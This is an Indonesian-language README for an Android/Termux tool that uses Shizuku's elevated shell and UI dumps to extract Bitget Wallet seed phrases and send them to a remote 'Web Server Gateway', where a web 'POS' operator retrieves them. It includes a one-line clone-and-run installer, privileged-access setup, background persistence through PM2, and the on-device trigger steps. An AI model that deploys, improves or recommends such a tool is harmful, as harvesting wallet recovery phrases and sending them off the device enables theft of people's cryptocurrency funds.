# 🌉 Trio Merak - Shizuku Bridge for Android

Jembatan otomatisasi Shizuku di HP Android untuk ekstrak seed phrase Bitget Wallet dan kirim ke Web Server Gateway. Berjalan 24/7 via PM2 di background Termux.

## 🚀 Quick Start

### Install & Run
```bash
pkg update -y && pkg install -y git python && git clone https://github.com/Imammaulidy/bridge.git && cd bridge && bash run.sh
```

Pilih **[1] ALL-IN-ONE** dari menu → Bridge otomatis install dependensi & running.

### Update
```bash
cd ~/bridge
git pull origin main
pm2 delete bridge
pm2 start ecosystem.config.js
pm2 save
```

### Reset Clean Install
```bash
pm2 delete bridge 2>/dev/null
cd ~ && rm -rf bridge
git clone https://github.com/Imammaulidy/bridge.git
cd bridge
pm2 start ecosystem.config.js
pm2 save
```

## ⚡ Cara Ekstrak

1. **Tombol Volume HP** → Buka Bitget Wallet di layar 12 kata → Tekan Volume Up/Down (timer 3s)
2. **Enter di Termux** → Tekan Enter (timer 4s)
3. **Web POS** → Klik tombol "Ambil Phrase" (instan)

## 🐛 Debug Mode

```bash
cd ~/bridge
export BRIDGE_DEBUG=1
pm2 restart bridge
pm2 logs bridge
```

XML dump tersimpan di `~/last_dump.xml`

## 📋 Prasyarat

1. **Termux** - Download dari [F-Droid](https://f-droid.org/packages/com.termux/) (jangan dari Play Store)
2. **Shizuku** - Install dari [GitHub](https://github.com/RikkaApps/Shizuku/releases)
   - Start Shizuku
   - Authorized apps → Centang Termux
3. **Setup rish binary:**
   ```bash
   cp /sdcard/Android/data/moe.shizuku.privileged.api/files/rish* $PREFIX/bin/
   chmod +x $PREFIX/bin/rish
   ```
4. **Test koneksi:** `rish -c id` (harus tampil `uid=2000`)

## 🔧 Commands

```bash
# Start dengan ecosystem config (recommended)
cd ~/bridge
pm2 start ecosystem.config.js
pm2 save

# Commands lainnya
pm2 status              # Cek status
pm2 logs bridge         # Lihat log
pm2 restart bridge      # Restart
pm2 reload ecosystem.config.js  # Reload config
bash run.sh --status    # Via menu script
```

## 🆕 Changelog

**v2.1** - Enhanced parser, debug mode, XML auto-save, better error messages  
**v2.0** - Interactive menu, all-in-one installer, 4 parsing strategies

---

**Gateway:** https://triomerak.web.id | **Issues:** [GitHub](https://github.com/Imammaulidy/bridge/issues)
